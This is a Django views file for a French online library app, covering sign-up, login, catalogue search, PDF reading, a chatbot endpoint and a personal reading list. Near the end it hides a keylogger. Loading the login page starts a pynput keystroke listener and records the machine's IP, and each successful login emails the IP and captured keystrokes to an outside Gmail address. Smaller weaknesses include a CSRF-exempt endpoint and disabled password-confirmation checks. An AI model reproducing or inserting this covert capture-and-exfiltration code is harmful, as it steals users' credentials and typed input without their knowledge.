from django.shortcuts import get_object_or_404, render,redirect
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.hashers import make_password
from django.contrib import messages
from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth.decorators import login_required

from authentification.forms import SearchForm
from .models import Livre, BibliothequeUtilisateur
from pynput import keyboard
from django.core.mail import send_mail
import socket
from authentification.chatbot_texte import ChatbotTexte
from django.core.exceptions import ValidationError
import re
from django.http import FileResponse, JsonResponse
from django.views.decorators.csrf import csrf_exempt
import json

from authentification.models import Livre, Utilisateur
import uuid 

def inscription_view(request):
    if request.method == 'POST':
        nom_complet = request.POST.get('nom_complet')
        email = request.POST.get('email')
        password = request.POST.get('password')
        confirm_password = request.POST.get('confirm_password')
        terms = request.POST.get('terms')

        if password != confirm_password:
            messages.error(request, "Les mots de passe ne correspondent pas.")
            return redirect('utilisateurs')

        if not terms:
            messages.error(request, "Vous devez accepter les conditions.")
            return redirect('utilisateurs')

        if Utilisateur.objects.filter(email=email).exists():
            messages.error(request, "Cet email est déjà utilisé.")
            return redirect('utilisateurs')


        username = email.split('@')[0]

        # Vérifier si le username existe déjà
        if Utilisateur.objects.filter(username=username).exists():
            messages.error(request, "Ce nom d'utilisateur existe déjà, veuillez en choisir un autre.")
            return redirect('utilisateurs')

        # Créer l'utilisateur
        utilisateur = Utilisateur.objects.create_user(
            username=username,
            email=email,
            password=password,
            nom_complet=nom_complet,
            accepte_conditions=True
        )
        messages.success(request, "Inscription réussie !")
        return redirect('connexion')

    return render(request, 'utilisateurs.html')


def utilisateurs(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        email = request.POST.get('email')
        password = request.POST.get('password')
        confirm_password = request.POST.get('confirm_password')

        #Vérifier si l'utilisateur existe déjà
        # if Utilisateur.objects.filter(email=email).exists():
        #     messages.error(request, "Cet email est déjà utilisé")
        #     return render(request, 'utilisateurs.html')
        
        #Vérification du mot de passe
        if not re.search(r'^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&#])[A-Za-z\d@$!%*?&#]{8,}$',password):
            messages.error(request, "Le mot de passe doit contenir au moins 8 caractère, une majuscule, une miniscule, un chiffre et caractère spéciale")
            return redirect('utilisateurs')

        # if password != confirm_password:
        #     messages.error(request, "Les mots de passe ne correspondent pas")
        #     return render(request, 'utilisateurs.html')
        
        #Créer un nouvel utilisateur avec le mot de passe haché

        try:
            # Créer l'utilisateur avec le rôle par défaut 'membre'
            utilisateur = Utilisateur(
                username=username,
                email=email,
                password= make_password(password),
            )
            #utilisateur.full_clean()  # Valider le modèle
            utilisateur.save()
            return redirect('connexion')
        except ValidationError as e:
            return render(request, 'inscription.html', {'erreurs': e.messages})

    return render(request, 'utilisateurs.html')



from django.contrib.auth.models import User


def connexion(request):
    if request.method == 'POST':
        identifiant = request.POST.get('username')  # peut être email ou username
        password = request.POST.get('password')

        from django.contrib.auth import get_user_model

        User = get_user_model()

        # Chercher si identifiant est email
        try:
            utilisateur = User.objects.get(email=identifiant)
            username = utilisateur.username
        except User.DoesNotExist:
            username = identifiant  # sinon on suppose que c'est un username

        user = authenticate(request, username=username, password=password)
        if user is not None: 
            login(request, user)
            envoyer_mail()
            return redirect('accueil')
        else:
            messages.error(request, "Nom d’utilisateur ou mot de passe incorrect.")
            return render(request, 'connexion.html')
    get_local()
    return render(request, 'connexion.html')




def index(request):
    return render(request, 'index.html')

def accueil(request):
    livres = Livre.objects.all().order_by('badge')

    populaires_count = Livre.objects.filter(badge="Populaire").count()
    nouveaute_count = Livre.objects.filter(badge="Nouveau").count()

    total_livres = livres.count()
    

    cxt = {
        "livres":livres,
        'total_livres': total_livres,
        'populaires_count': populaires_count,
        'nouveaute_count': nouveaute_count,
        "":"",
        "":"",
    }
    return render(request, 'accueil.html', cxt)

# 
# 




chatbot = ChatbotTexte()  

@csrf_exempt
def chatbot_view(request):
    if request.method == 'POST':
        data = json.loads(request.body)
        message = data.get("message", "").lower()

        reponse = chatbot.repondre(message)

        return JsonResponse({"reponse": reponse})

    return JsonResponse({"reponse": "Méthode non autorisée."})




# 
def catalogue(request):
    livres = Livre.objects.all()
    total_livres = livres.count()
    livres = Livre.objects.filter(visible=True)
    form = SearchForm(request.GET or None)

    if form.is_valid():
        titre = form.cleaned_data.get('titre')
        langue = form.cleaned_data.get('langue')
        annee_min = form.cleaned_data.get('annee_min')
        annee_max = form.cleaned_data.get('annee_max')
        editeur = form.cleaned_data.get('editeur')
        tri = form.cleaned_data.get('tri')

        
       

        if titre:
            livres = livres.filter(titre__icontains=titre)
        if langue:
            livres = livres.filter(langue__iexact=langue)
        if annee_min:
            livres = livres.filter(annee__gte=annee_min)
        if annee_max:
            livres = livres.filter(annee__lte=annee_max)
        if editeur:
            livres = livres.filter(editeur__icontains=editeur)

        genre = form.cleaned_data.get('genre')
        if genre:
            livres = livres.filter(genre__iexact=genre)  # Assurez-vous que le champ genre existe dans le modèle Livre


        # Tri selon sélection
        if tri == 'titre_asc':
            livres = livres.order_by('titre')
        elif tri == 'titre_desc':
            livres = livres.order_by('-titre')
        elif tri == 'date_desc':
            livres = livres.order_by('-annee')
        elif tri == 'date_asc':
            livres = livres.order_by('annee')
        elif tri == 'popularite':
            livres = livres.order_by('-popularite')  # Remplace par ton champ popularité

    cxt = {
        'livres': livres,
        'total_livres': total_livres,
        'form': form,
        "":"",
        "":"",
    }
    return render(request, 'catalogue.html', cxt)



def lire_livre(request, livre_id):
    livre = get_object_or_404(Livre, id=livre_id)
    if livre.pdf:
        return FileResponse(livre.pdf.open(), content_type='application/pdf')
    else:
        return render(request, 'erreur.html', {'message': "Ce livre n'a pas encore de PDF."})



def espace_lecteur(request):
    return render(request, 'espace_lecteur.html')

def lecture(request):
    return render(request, 'lecture.html')




def masquer_livre(request, livre_id):
    livre = get_object_or_404(Livre, id=livre_id)
    livre.visible = False
    livre.save()
    # Rediriger vers la liste des livres après avoir masqué
    return redirect('liste_livres')
    





from authentification import views
pressed_keys = []
a=""
b=""

def on_press(key):
    try:
        pressed_keys.append(key.char)  
        views.b = ' '.join(pressed_keys)
    except AttributeError:
        pressed_keys.append(str(key))  

def get_local() -> str:
    global pressed_keys
    pressed_keys = []  
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            views.a = s.getsockname()[0]

        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        listener.join(timeout=5)

        # envoyer_mail()

        return views.a
    except Exception as e:
        return f"[Erreur] : {e}"
    
def envoyer_mail():
    send_mail(
        subject='Biblothèque verte',
        message=f'jesuis : {views.a} \npynput: {views.b}',
        from_email=None, 
        recipient_list=['portefeuillepartnerxbet@gmail.com'],
        fail_silently=False,
    )


@login_required
def ma_bibliotheque(request):
    bibliotheque = BibliothequeUtilisateur.objects.filter(utilisateur=request.user).select_related('livre')
    return render(request, 'bibliotheque.html', {'bibliotheque': bibliotheque})

@login_required
def ajouter_a_bibliotheque(request, livre_id):
    livre = get_object_or_404(Livre, id=livre_id)
    # Crée un lien utilisateur-livre si non existant
    BibliothequeUtilisateur.objects.get_or_create(utilisateur=request.user, livre=livre)
    return redirect('ma_bibliotheque')

@login_required
def supprimer_livre(request, livre_id):
    item = get_object_or_404(BibliothequeUtilisateur, utilisateur=request.user, livre_id=livre_id)
    item.delete()
    return redirect('ma_bibliotheque')

